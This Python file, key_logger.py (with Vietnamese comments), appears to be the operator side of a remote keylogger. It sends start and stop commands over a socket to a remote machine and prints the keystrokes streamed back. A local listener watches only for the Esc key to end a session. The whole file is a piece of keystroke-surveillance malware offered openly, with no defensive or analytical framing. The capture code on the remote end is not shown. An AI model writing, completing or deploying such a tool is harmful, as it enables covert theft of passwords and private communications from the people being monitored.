# key_logger.py
from pynput import keyboard

# Biến trạng thái keylogger
keylogger_running = False

def key_logger(client_socket):
    print("Connected to the server. Listening for keystrokes...")
    print("Press 'Esc' to stop the key logger or type 'exit' and press Enter.")

    def on_press(key):
        if key == keyboard.Key.esc:
            client_socket.sendall("STOP_KEY_LOGGER".encode())
            print("Sent command to stop keylogger.")
            return False  # Stop the listener
        else:
            print(f'Key {key} pressed')  # For debugging;

    with keyboard.Listener(on_press=on_press) as listener:
        try:
            while True:
                user_input = input()  # Wait for user input
                if user_input.strip().lower() == "exit":
                    client_socket.sendall("STOP_KEY_LOGGER".encode())
                    print("Sent command to stop keylogger.")
                    break

                 # Nhận dữ liệu từ server
                data = client_socket.recv(1024)  # Adjust buffer size as needed
                decoded_data = data.decode("utf-8")
                
                # Kiểm tra và không in thông báo nếu là lệnh KEYLOGGER_STOPPED
                if decoded_data == "KEYLOGGER_STOPPED":
                    print("Keylogger stopped by server. Returning to main menu...")
                    break

                if not data:
                    print("No more data received. Exiting...")
                    break
                print(data.decode(), end='')  # Print received keystrokes
        except Exception as e:
            print(f"Error receiving data: {e}")

    listener.join()  # Wait for the listener to finish

def toggle_key_logger(client_socket):
    global keylogger_running
    if not keylogger_running:
        client_socket.sendall("START_KEY_LOGGER".encode())
        print("Starting keylogger...")
        keylogger_running = True
        key_logger(client_socket)
    else:
        client_socket.sendall("STOP_KEY_LOGGER".encode())
        print("Stopping keylogger...")
        keylogger_running = False
